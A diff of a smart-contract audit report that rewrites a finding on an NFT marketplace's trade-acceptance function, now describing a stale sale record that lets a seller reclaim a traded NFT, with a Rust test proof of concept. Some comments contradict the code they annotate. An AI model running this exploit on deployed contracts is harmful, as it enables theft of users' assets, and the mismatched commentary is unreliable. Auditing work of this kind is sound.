@@ -592,55 +592,162 @@ In this example, the malicious contract continually attempts to withdraw the spe
 
 ### Description
 
-The vulnerability lies in the exec_accept_trade function. The function first retrieves the trade from the `TRADES` storage, and then retrieves the corresponding sale from the `SALES` storage. However, there is no check in place to ensure that the NFT being traded is actually the NFT listed in the sale.
+It appears that when a trade is accepted, the exec_accept_trade function deletes the trade record but does not remove the corresponding sale record.
 
-An attacker could create a trade, offering an NFT they own and specifying a high-value NFT as the one they're asking for. Then, they could trick the owner of the high-value NFT into accepting the trade by making it appear as though they are offering a high-value NFT in return. The owner of the high-value NFT would be expecting to receive a high-value NFT in return, but because the `exec_accept_trade` function does not verify that the NFT being offered is the one listed in the sale, the attacker could instead send a low-value NFT.
+Here's how the exploit could work:
+
+1. Bob offers to trade one of his NFTs (NFT2) for Alice's NFT1.
+2. Alice lists an NFT (NFT1) for sale and marks it as tradable.
+3. Alice accepts the trade. NFT1 is transferred to Bob, and NFT2 is transferred to Alice. The trade record is removed.
+4. However, the sale record for NFT1 is still in place, and the sale owner is Alice.
+5. Alice buys the NFT, transferring NFT1 back to herself and transferring funds back to herself.
 
 ### Recommendation
 
-To prevent this, the `exec_accept_trade` function should verify that the NFT being offered in the trade is the same as the one listed in the sale. Here's how the `exec_accept_trade` function might be updated to fix this vulnerability:
-
-```rust
-pub fn exec_accept_trade(deps: DepsMut, info: MessageInfo, asked_id: String, trader: String,) -> Result<Response, ContractError> {
-    let trade = TRADES.load(deps.storage, (asked_id.clone(), trader))?;
-    let sale = SALES.load(deps.storage, asked_id)?;
-
-    // Verify that the NFT being offered is the one listed in the sale
-    if trade.to_trade_id != sale.nft_id {
-        return Err(ContractError::IncorrectNFT);
-    }
-
-    // ... rest of function ...
-}
-```
-
-With this update, the contract will reject trades where the NFT being offered is not the one listed in the sale, preventing this kind of exploit.
+To prevent this, the `exec_accept_trade` function should remove both `TRADES` and `SALES`. Additionally, the contract should verify the NFT owner before transferring.
 
 ### Proof of concept
 
-Here is an example of how a malicious contract might exploit this vulnerability:
+Here is an example of how a malicious attacker may exploit this vulnerability:
 
 ```rust
-// Contract that exploits the trading vulnerability
-# [cfg_attr (not (feature = "library"), entry_point)]
-pub fn execute(deps: DepsMut, _env: Env, _info: MessageInfo, msg: ExecuteMsg,) -> Result<Response, ContractError> {
-    match msg {
-        ExecuteMsg::ExploitTrade { high_value_nft_id, low_value_nft_id } => {
-            let trade_msg = ExecuteMsg::NewTrade {
-                target: high_value_nft_id,
-                offered: low_value_nft_id
-            };
-            let result = deps.api.execute_contract(&trade_msg);
-            if result.is_err() {
-                return Err(ContractError::FailedTrade);
-            }
-            Ok(Response::new().add_attribute("action", "trade exploit"))
-        }
-    }
-}
-```
+#[test]
+    fn trade_exploit() {
+        let (mut app, contract_addr, token_addr) = proper_instantiate();
 
-In this example, the malicious contract creates a new trade, offering a low-value NFT and asking for a high-value NFT.
+        // Approve to transfer the NFT
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            token_addr.clone(),
+            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
+                spender: contract_addr.to_string(),
+                token_id: NFT1.to_string(),
+                expires: None,
+            },
+            &[],
+        )
+        .unwrap();
+
+        // Approve to transfer the NFT
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            token_addr.clone(),
+            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
+                spender: contract_addr.to_string(),
+                token_id: NFT2.to_string(),
+                expires: None,
+            },
+            &[],
+        )
+        .unwrap();
+
+        // 1. Alice lists an NFT (NFT1) for sale and marks it as tradable.
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::NewSale {
+                id: NFT1.to_string(),
+                price: Uint128::from(100u128),
+                tradable: true,
+            },
+            &[],
+        )
+        .unwrap();
+
+        // 2. Bob offers to trade one of his NFTs (NFT2) for Alice's NFT1.
+        // Create trade offer
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::NewTrade {
+                target: NFT1.to_string(),
+                offered: NFT2.to_string(),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // 3. Alice accepts the trade. NFT1 is transferred to Bob, and NFT2 is transferred to Alice. The trade record is removed.
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::AcceptTrade {
+                id: NFT1.to_string(),
+                trader: USER2.to_string(),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // 4. However, the sale record for NFT1 is still in place, and the trade owner is Alice.
+        let sale_info: Sale = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::GetSale {
+                    id: NFT1.to_string(),
+                },
+            )
+            .unwrap();
+        assert_eq!(sale_info.owner, USER1.to_string());
+
+        // 5. Charlie tries to buy NFT1, and pays Alice.
+        // Approve to transfer the NFT
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            token_addr.clone(),
+            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
+                spender: contract_addr.to_string(),
+                token_id: NFT1.to_string(),
+                expires: None,
+            },
+            &[],
+        )
+        .unwrap();
+
+        app = mint_tokens(app, USER1.to_owned(), sale_info.price);
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::BuyNFT {
+                id: NFT1.to_string(),
+            },
+            &[coin(100u128, DENOM)],
+        )
+        .unwrap();
+
+        // confirm Alice has NFT2 and funds
+        let owner_of: OwnerOfResponse = app
+            .wrap()
+            .query_wasm_smart(
+                token_addr.clone(),
+                &Cw721QueryMsg::OwnerOf {
+                    token_id: NFT1.to_string(),
+                    include_expired: None,
+                },
+            )
+            .unwrap();
+        assert_eq!(owner_of.owner, USER1.to_string());
+        let owner_of: OwnerOfResponse = app
+            .wrap()
+            .query_wasm_smart(
+                token_addr,
+                &Cw721QueryMsg::OwnerOf {
+                    token_id: NFT2.to_string(),
+                    include_expired: None,
+                },
+            )
+            .unwrap();
+        assert_eq!(owner_of.owner, USER1.to_string());
+        // confirm balance of USER1
+        let balance = app
+            .wrap()
+            .query_balance(USER1.to_string(), DENOM)
+            .unwrap()
+            .amount;
+        assert_eq!(balance, Uint128::from(100u128));
+    }
+```
 
 ---
 
